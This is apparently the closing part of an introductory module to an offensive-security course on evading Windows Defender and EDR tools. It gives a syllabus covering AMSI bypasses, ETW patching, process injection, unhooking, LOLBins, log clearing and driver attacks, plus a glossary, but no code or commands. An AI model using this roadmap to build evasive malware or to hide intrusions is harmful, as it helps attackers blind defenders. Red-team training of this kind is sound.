Module 01A: AMSI Bypasses Part 1 (reflection, string tricks, basic patching)
Module 01B: AMSI Bypasses Part 2 (advanced patching, hardware breakpoints)
Module 02:  ETW Patching (disable logging)
Module 03:  Process Injection Basics (DLL injection, CreateRemoteThread)
Module 04:  Process Injection Advanced (hollowing, reflective DLL, APC)
Module 05:  Code Obfuscation (strings, encoding, polymorphic code)
Module 06:  Syscalls and Unhooking (direct syscalls, ntdll unhooking)
Module 07:  Living off the Land (LOLBins - certutil, mshta, bitsadmin)
Module 08:  Payload Encryption (AES, XOR, custom loaders)
Module 09:  Advanced Memory (RWX evasion, code caves, ROP)
Module 10:  Timestomping (file times, log clearing, artifact removal)
Module 11:  Process Manipulation (PPID spoofing, token tricks)
Module 12:  PPL and Kernel (BYOVD, driver attacks)
```

---

## GLOSSARY

```
Term                 What It Means
---------------------------------------------------------------
PE                   Portable Executable - the format of EXE and DLL files
Process              A running program with its own memory space
PID                  Process ID - unique number for each process
Thread               The part of a process that runs code
PEB                  Process Environment Block - process metadata structure
VAS                  Virtual Address Space - private memory for each process
DLL                  Dynamic Link Library - shared code files
API                  Application Programming Interface - functions to call
Syscall              System Call - user mode request to kernel
User Mode            Where programs run (limited access)
Kernel Mode          Where the OS runs (full access)
ntdll.dll            The bridge between user mode and kernel mode
kernel32.dll         High-level Windows API functions
amsi.dll             Anti-Malware Scan Interface DLL
WdFilter.sys         Defender's kernel file system filter driver
MsMpEng.exe          Defender's main service process
MpEngine.dll         Defender's scan engine
Hook                 Code placed by EDR to watch API calls
Unhooking            Removing EDR hooks to avoid detection
RWX                  Read-Write-Execute memory (suspicious)
ETW                  Event Tracing for Windows - logging system
Provider             ETW component that creates events
Consumer             ETW component that reads events
C2                   Command and Control framework
Shellcode            Small position-independent code
Payload              Code you want to run on the target
Beacon               C2 agent that checks in with the server
Signature            Known byte pattern that identifies malware
Heuristic            Rule-based guess about suspicious behavior
Behavioral           Detection based on what a program does
PPL                  Protected Process Light
ASR                  Attack Surface Reduction rules
BYOVD                Bring Your Own Vulnerable Driver
```

---

## END OF MODULE 00

Next: [Module 01A - AMSI Bypasses Part 1](./01_AMSI_BYPASSES_PART1.md)

---

*This course is for authorized security testing and education only.*
*Always get written permission before testing any system.*
*The author is not responsible for misuse of this information.*
